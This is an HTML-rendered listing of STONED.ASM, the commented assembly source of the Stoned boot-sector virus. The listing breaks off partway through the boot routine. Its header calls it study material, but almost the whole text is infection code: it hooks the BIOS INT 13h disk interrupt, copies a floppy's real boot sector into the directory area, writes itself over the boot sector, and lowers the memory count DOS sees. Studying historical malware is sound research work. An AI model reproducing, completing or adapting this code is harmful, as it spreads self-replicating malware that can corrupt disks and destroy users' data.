<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>STONED.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">TITLE</span><span class="sc0">   </span><span class="sc5">STONBOOT</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">80</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">-</span><span class="sc2">90</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc9">PAGE</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc4">,</span><span class="sc2">132</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         *** NOT FOR GENERAL DISTRIBUTION ***     The Stoned Virus</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This file is for the purpose of virus study only! It should not be passed</span><span class="sc0">
</span><span class="sc1">;  around among the general public. It will be very useful for learning</span><span class="sc0">
</span><span class="sc1">;  how viruses work and propagate. But anybody with access to an assembler</span><span class="sc0">
</span><span class="sc1">;  can turn it into a working virus and anybody with a bit of assembly coding</span><span class="sc0">
</span><span class="sc1">;  experience can turn it into a far more malevolent program than it already</span><span class="sc0">
</span><span class="sc1">;  is. Keep this code in reasonable hands!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a boot sector virus, and an extremely tiny one. It occupies only a</span><span class="sc0">
</span><span class="sc1">;  single sector. On a diskette, it resides in the boot sector, and on a hard</span><span class="sc0">
</span><span class="sc1">;  disk resides in the mastor boot record. It can be installed on a 5 1/4 inch</span><span class="sc0">
</span><span class="sc1">;  diskette by copying the real boot sector to side 1, track 0, sector 3. This</span><span class="sc0">
</span><span class="sc1">;  is the last sector used by the directory, and is usually not used. If the</span><span class="sc0">
</span><span class="sc1">;  directory ever does expand into this area, then the real boot sector will be</span><span class="sc0">
</span><span class="sc1">;  trashed, and the diskette will no longer be bootable. Once the boot sector</span><span class="sc0">
</span><span class="sc1">;  is copied to the directory area, this code goes into the boot sector space</span><span class="sc0">
</span><span class="sc1">;  at side 0, track 0, sector 1. The system is then transferred to the diskette</span><span class="sc0">
</span><span class="sc1">;  and the diskette contains an activated virus. Once this diskette is used to</span><span class="sc0">
</span><span class="sc1">;  boot up a system, it will become resident and infect other diskettes it</span><span class="sc0">
</span><span class="sc1">;  sees. If the system contains a hard drive, it too will become infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus does not contain any time bomb, but it can cause loss of data by</span><span class="sc0">
</span><span class="sc1">;  wrecking a directory here or there.</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">


</span><span class="sc5">LF</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0AH</span><span class="sc0">
</span><span class="sc5">CR</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0DH</span><span class="sc0">

</span><span class="sc5">XSEG</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0"> </span><span class="sc9">AT</span><span class="sc0">      </span><span class="sc2">07C0h</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">NEWSEG</span><span class="sc0">  </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">FAR</span><span class="sc0">
</span><span class="sc5">XSEG</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">SEGMENT</span><span class="sc0">
        </span><span class="sc9">ASSUME</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Execution begins here as a boot record. This means that its location and</span><span class="sc0">
</span><span class="sc1">;  CS:IP will be 0000:7C00. The following two JMP instructions accomplish only</span><span class="sc0">
</span><span class="sc1">;  a change in CS:IP so that CS is 07C0. The following two JMPs, and the</span><span class="sc0">
</span><span class="sc1">;  segment definition of XSEG above are best not tampered with.</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">


        </span><span class="sc6">JMP</span><span class="sc0">  </span><span class="sc10">FAR</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">NEWSEG</span><span class="sc0">     </span><span class="sc1">;This is exactly 5 bytes long. Don't change it</span><span class="sc0">

</span><span class="sc1">;The above line will jump to here, with a CS of 07C0 and an IP of 5</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">JPBOOT</span><span class="sc0">                  </span><span class="sc1">;Jump here at boot up time</span><span class="sc0">


</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; The following offsets:</span><span class="sc0">
</span><span class="sc1">;    D_TYPE</span><span class="sc0">
</span><span class="sc1">;    O_13_O</span><span class="sc0">
</span><span class="sc1">;    O_13_S</span><span class="sc0">
</span><span class="sc1">;    J_AD_O</span><span class="sc0">
</span><span class="sc1">;    J_AD_S</span><span class="sc0">
</span><span class="sc1">;    BT_ADD</span><span class="sc0">
</span><span class="sc1">;  will be used to access their corresponding variables throughout the code.</span><span class="sc0">
</span><span class="sc1">;  They will vary in different parts of the code, since the code relocates</span><span class="sc0">
</span><span class="sc1">;  itself and the values in the segment registers will change. The actual</span><span class="sc0">
</span><span class="sc1">;  variables are defined with a leading underscore, and should not be used. As</span><span class="sc0">
</span><span class="sc1">;  the segment registers, and the offsets used to access them, change in the</span><span class="sc0">
</span><span class="sc1">;  code, the offsets will be redefined with "=" operators. At each point, the</span><span class="sc0">
</span><span class="sc1">;  particular segment register override needed to access the variables will be</span><span class="sc0">
</span><span class="sc1">;  given.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In this area, the variables should be accessed with the CS: segment override.</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">D_TYPE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;The type of disk we are booting from</span><span class="sc0">
</span><span class="sc5">_D_TYPE</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">OLD_13</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">O_13_O</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Old INT 13 vector offset</span><span class="sc0">
</span><span class="sc5">_O_13_O</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">O_13_S</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Old INT 13 vector segment</span><span class="sc0">
</span><span class="sc5">_O_13_S</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">JMP_ADR</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">J_AD_O</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Offset of the jump to relocated code</span><span class="sc0">
</span><span class="sc5">_J_AD_O</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HI_JMP</span><span class="sc0">

</span><span class="sc5">J_AD_S</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Segment of the jump to the relocated code</span><span class="sc0">
</span><span class="sc5">_J_AD_S</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">BT_ADD</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Fixed address 0:7C00. Jump addr to boot sector</span><span class="sc0">
</span><span class="sc5">_BT_ADD</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">7C00h</span><span class="sc0">           </span><span class="sc1">;Boot address segment</span><span class="sc0">
        </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;Boot address offset</span><span class="sc0">



</span><span class="sc1">;**********************************************************</span><span class="sc0">
</span><span class="sc1">;       The INT 13H vector gets hooked to here</span><span class="sc0">
</span><span class="sc1">;**********************************************************</span><span class="sc0">

</span><span class="sc5">NEW_13</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">REAL13</span><span class="sc0">                  </span><span class="sc1">;Restore regs &amp; do real INT 13H</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">REAL13</span><span class="sc0">                  </span><span class="sc1">;Restore regs &amp; do real INT 13H</span><span class="sc0">

</span><span class="sc1">;*****************************************************************</span><span class="sc0">
</span><span class="sc1">;    We only get here for service 2 or 3 - Disk read or write</span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">REAL13</span><span class="sc0">                  </span><span class="sc1">;Restore regs &amp; do real INT 13H</span><span class="sc0">

</span><span class="sc1">;*****************************************************************</span><span class="sc0">
</span><span class="sc1">;     And we only get here if it's happening to drive A:</span><span class="sc0">
</span><span class="sc1">;*****************************************************************</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc2">43FH</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;Check to see if drive motor is on</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">REAL13</span><span class="sc0">                  </span><span class="sc1">;Restore regs &amp; do real INT 13H</span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">;           We only get here if the drive motor is on.</span><span class="sc0">
</span><span class="sc1">;******************************************************************</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INFECT</span><span class="sc0">                  </span><span class="sc1">;Try to infect the disk</span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">;                Restore regs &amp; do real INT 13H</span><span class="sc0">
</span><span class="sc1">;******************************************************************</span><span class="sc0">

</span><span class="sc5">REAL13</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0">       </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">OLD_13</span><span class="sc0">



</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;***          See if we can infect the disk                 ***</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">

</span><span class="sc5">INFECT</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">    </span><span class="sc10">NEAR</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">;We'll try up to 4 times to read it</span><span class="sc0">

</span><span class="sc1">;***************************************************************</span><span class="sc0">
</span><span class="sc1">;            Loop to try reading disk sector</span><span class="sc0">
</span><span class="sc1">;***************************************************************</span><span class="sc0">

</span><span class="sc5">RDLOOP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">201H</span><span class="sc0">         </span><span class="sc1">;Read one sector...</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">         </span><span class="sc1">;...into a space at the end of the code</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">;Side 0, drive A</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">              </span><span class="sc1">;Track 0, sector 1</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">OLD_13</span><span class="sc0">     </span><span class="sc1">;Do the old INT 13</span><span class="sc0">

        </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">RD_OK</span><span class="sc0">           </span><span class="sc1">;Disk read was OK</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">OLD_13</span><span class="sc0">     </span><span class="sc1">;Reset disk</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">              </span><span class="sc1">;Bump the counter</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">RDLOOP</span><span class="sc0">          </span><span class="sc1">;Loop to try reading disk sector</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0">   </span><span class="sc5">QUIT</span><span class="sc0">    </span><span class="sc1">;Close up and return if all 4 tries failed</span><span class="sc0">

        </span><span class="sc6">NOP</span><span class="sc0">

</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">; Here if disk read was OK. We got the boot sector. But is it already infected?</span><span class="sc0">
</span><span class="sc1">;  Find out by comparing the first 4 bytes of the boot sector to the first 4</span><span class="sc0">
</span><span class="sc1">;  bytes of this code. If they don't match exactly, infect the diskette.</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">RD_OK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">HIDEIT</span><span class="sc0">                  </span><span class="sc1">;Hide floppy boot sector in directory</span><span class="sc0">

        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">QUIT</span><span class="sc0">                    </span><span class="sc1">;Close up and return</span><span class="sc0">

</span><span class="sc1">;************************************************************</span><span class="sc0">
</span><span class="sc1">;       Infect - Hide floppy boot sector in directory</span><span class="sc0">
</span><span class="sc1">;************************************************************</span><span class="sc0">

</span><span class="sc5">HIDEIT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">         </span><span class="sc1">;Write 1 sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">         </span><span class="sc1">;From the space at the end of this code</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;To sector 3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;Side 1</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">OLD_13</span><span class="sc0">     </span><span class="sc1">;Do the old INT 14</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">QUIT</span><span class="sc0">            </span><span class="sc1">;Close up and return if failed</span><span class="sc0">

</span><span class="sc1">;******************************************************************</span><span class="sc0">
</span><span class="sc1">; If write was sucessful, write this code to the boot sector area</span><span class="sc0">
</span><span class="sc1">;******************************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">         </span><span class="sc1">;Write 1 sector ...</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;...of this very code...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;...to sector 1...</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">;...of Side 0, drive A</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">OLD_13</span><span class="sc0">     </span><span class="sc1">;Do an old INT 13</span><span class="sc0">

</span><span class="sc1">;  ***NOTE*** no test has been done for a sucessful write.</span><span class="sc0">

</span><span class="sc1">;***************************************************************</span><span class="sc0">
</span><span class="sc1">;                    Close up and return</span><span class="sc0">
</span><span class="sc1">;***************************************************************</span><span class="sc0">

</span><span class="sc5">QUIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">INFECT</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">





</span><span class="sc1">;****************************************************************</span><span class="sc0">
</span><span class="sc1">;***             Jump here at boot up time</span><span class="sc0">
</span><span class="sc1">;****************************************************************</span><span class="sc0">




</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Redefine the variable offsets. The code here executes in the memory area</span><span class="sc0">
</span><span class="sc1">;  used by the normal boot sector. The variable offsets have an assembled</span><span class="sc0">
</span><span class="sc1">;  value of the order 7Cxx. Access them here through the DS: segment override</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">


</span><span class="sc5">D_TYPE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">07C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_D_TYPE</span><span class="sc0">
</span><span class="sc5">O_13_O</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">07C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_O_13_O</span><span class="sc0">
</span><span class="sc5">O_13_S</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">07C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_O_13_S</span><span class="sc0">
</span><span class="sc5">J_AD_O</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">07C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_J_AD_O</span><span class="sc0">
</span><span class="sc5">J_AD_S</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">07C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_J_AD_S</span><span class="sc0">
</span><span class="sc5">BT_ADD</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">07C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_BT_ADD</span><span class="sc0">



</span><span class="sc5">JPBOOT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;DS = 0</span><span class="sc0">

</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;                Set up a usable stack</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;SS = 0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc2">7C00H</span><span class="sc0"> </span><span class="sc1">;Position stack at 0000:7C00</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">

</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;        Capture the INT 13 vector (BIOS disk I/O)</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc2">4CH</span><span class="sc0">       </span><span class="sc1">;Offset for old INT 13 vector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">O_13_O</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">;Save the offset</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc2">4EH</span><span class="sc0">       </span><span class="sc1">;Segment for old INT 13 vector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">O_13_S</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">;Save the segment</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Decrease the memory available to DOS by 2K. Only 1K really seems needed, but</span><span class="sc0">
</span><span class="sc1">;  stealing an odd number of K would result in an odd number shown available</span><span class="sc0">
</span><span class="sc1">;  when a CHKDSK is run. This might be too obvious. Or the programmer may have</span><span class="sc0">
</span><span class="sc1">;  had other plans for the memory.</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc2">413H</span><span class="sc0">      </span><span class="sc1">;BIOS' internal count of available memory</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">;Drop it by 2K ...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc2">413H</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">;...and store it (steal it!!)</span><span class="sc0">

</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;        Find the segment of the stolen memory</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
